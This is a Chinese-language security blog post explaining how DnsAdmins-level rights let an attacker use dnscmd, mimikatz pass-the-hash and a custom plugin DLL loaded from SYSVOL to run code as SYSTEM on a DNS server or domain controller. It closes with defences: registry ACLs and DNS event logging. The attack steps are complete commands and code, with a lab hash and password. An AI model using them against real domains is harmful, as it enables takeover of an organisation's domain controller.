---
layout: post
title: 域渗透——利用dnscmd在DNS服务器上实现远程加载Dll
---


## 0x00 前言
---

由Shay Ber公开的一个利用方法，在域环境中，使用DNSAdmin权限能够在DNS服务器上实现远程加载Dll。这不算漏洞，但可以作为一个域渗透的技巧，本文将结合自己的经验整理这个利用技巧，添加自己的理解，对照利用思路给出防御建议。

参考资料：

https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83

## 0x01 简介
---

本文将要介绍以下内容：

- 详细利用方法
- 防御思路

## 0x02 详细利用方法
---

#### 利用条件：

已获得域内DnsAdmins，Domain Admins或者Enterprise Admins组内用户的口令或者hash

**注：**

默认配置下，不仅仅是DnsAdmins组内的用户，Domain Admins或者Enterprise Admins组内的用户也可以

### 1、查看关键组内的用户

查看所有的组：

```
net group /domain
```

查看DnsAdmins组内的用户：

无法使用`net group`命令查看，可以使用[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)查看

```
import-module .\PowerView.ps1
Get-NetGroupMember -GroupName "DNSAdmins"
```

查看Domain Admins组内的用户：

```
net group "Domain Admins" /domain
```

查看Enterprise Admins组内的用户：

```
net group "Enterprise Admins" /domain
```

### 2、获得关键用户的口令或者hash

需要获得DnsAdmins，Domain Admins或者Enterprise Admins组内任一用户的口令或者hash

### 3、准备Payload.dll

需要定义三个导出函数：

- DnsPluginInitialize
- DnsPluginCleanup
- DnsPluginQuery

定义导出函数可以参考之前开源的工程：

https://github.com/3gstudent/Add-Dll-Exports

这里使用def文件的方式声明导出函数，测试代码如下：

dllmain.cpp：

```
DWORD WINAPI DnsPluginInitialize(PVOID a1, PVOID a2)
{
	return 0;
}

DWORD WINAPI DnsPluginCleanup()
{
	return 0;
}

DWORD WINAPI DnsPluginQuery(PVOID a1, PVOID a2, PVOID a3, PVOID a4)
{
	WinExec("calc.exe", SW_SHOWNORMAL);
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```

.def文件：

```
EXPORTS
DnsPluginInitialize
DnsPluginCleanup
DnsPluginQuery
```

编译生成testdns.dll

### 4、Payload.dll保存的位置

需要能被DNS服务器远程访问

这里可以使用域内共享文件夹SYSVOL，默认所有的域用户都能访问

更多细节可参考之前的文章：[《域渗透——利用SYSVOL还原组策略中保存的密码》](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/)

我的测试域环境名称为test.com，使用的域内共享文件夹路径为：`\\test.com\SYSVOL\test.com\scripts\testdns.dll`

### 5、准备dnsadmin

通常，域内的Windows主机不支持dnsadmin命令

默认安装的系统：

- Windows Server 2003
- Windows Server 2008
- Windows Server 2003 R2
- Windows Server 2008 R2
- Windows Server 2012
- Windows Server 2003 with SP1
- ...

参考资料：

https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc772069(v=ws.11)

Win7系统在使用时需要安装Remote Server Administration Tools (RSAT)

这里介绍在未安装Remote Server Administration Tools (RSAT)的系统上执行dnscmd命令的方法：

#### (1)将dnscmd.exe保存在C:\Windows\System32下

可用下载地址:

https://github.com/3gstudent/test/blob/master/dnscmd.exe

#### (2)将dnscmd.exe.mui保存在C:\Windows\System32\en-US下

可用下载地址:

https://github.com/3gstudent/test/blob/master/dnscmd.exe.mui

**注：**

dnscmd.exe和dnscmd.exe.mui是在我的测试系统(Windows Server 2008 R2x64)中获得的

方法细节可参考之前的文章[《域渗透——DNS记录的获取》](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96/)

### 6、启动dnscmd

dnscmd不支持输入凭据进行远程操作的功能，这里需要使用mimikatz的Over pass the hash功能

测试环境已获得关键用户的信息如下：

用户名：Administrator
口令：DomainAdmin456!
hash：A55E0720F0041193632A58E007624B40

命令行下执行：

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /domain:test.com /ntlm:A55E0720F0041193632A58E007624B40"
```

这样会弹出一个cmd.exe，在cmd.exe中执行dnscmd命令即可

也可以实现自动化输入：

命令行下执行：

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /domain:test.com /ntlm:A55E0720F0041193632A58E007624B40 /run:\"cmd.exe /c c:\test\1.bat\""
```

`c:\test\1.bat`中保存dnscmd的命令

### 7、使用dnscmd命令

DNS服务器的IP：192.168.10.1

命令行执行：

```
dnscmd 192.168.10.1 /config /serverlevelplugindll \\test.com\SYSVOL\test.com\scripts\testdns.dll
```

对于DNS服务器来说，此时会新建一个注册表项

位置：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\`

- ServerLevelPluginDll
- REG_SZ
- `\\test.com\SYSVOL\test.com\scripts\testdns.dll`

### 8、重启DNS服务后会加载dll

等待DNS服务器重启

或者远程重启DNS服务器：

```
sc \\192.168.10.1 stop dns
sc \\192.168.10.1 start dns
```

DNS服务器的后台进程如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-5-22/2-1.png)

dns.exe将会多次调用testdns.dll，权限为System

### 9、实际利用

实际环境中，通常DNS服务器和域控制器是同一台主机

## 0x03 防御建议
---

### 1、控制权限

避免关键用户凭据被攻击者获得

这里可以使用[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)查看关键用户登陆过哪些主机

```
import-module .\PowerView.ps1
Invoke-UserHunter -UserName AdministratorUser
```

### 2、监控和设置注册表

位置：`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\`

利用dnscmd在DNS服务器上实现远程加载Dll时，会以System权限修改注册表，如果修改注册表`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\`的ACL(Access Control List)，删除System用户的Set Value权限，能够阻止这个方法的利用

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-5-22/2-2.png)

但有可能影响其他正常功能，该注册表项下的其他键值信息如下：

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WIN-F08C969D7FM.test.com
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
```

### 3、查看日志

#### (1)记录DNS服务的启动和停止

位置：`Application and Services Logs`->`DNS Server`

命令行查看：

```
wevtutil qe "dns server" /rd:true /f:text
```

ID为2代表DNS服务启动，ID为4代表DNS服务关闭

#### (2)记录添加Dll的操作

需要使用增强版的DNS日志记录和诊断功能，Server2016默认支持，Server2012需要安装补丁2956577

参考文档：

https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800669(v=ws.11)

补丁说明：

https://support.microsoft.com/en-us/help/2956577/update-adds-query-logging-and-change-auditing-to-windows-dns-servers

补丁下载：

https://www.catalog.update.microsoft.com/Search.aspx?q=2956577

添加Dll的操作会产生ID为541的日志

## 0x04 小结
---

本文介绍了利用dnscmd在DNS服务器上实现远程加载Dll的方法，结合利用思路给出防御建议。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)





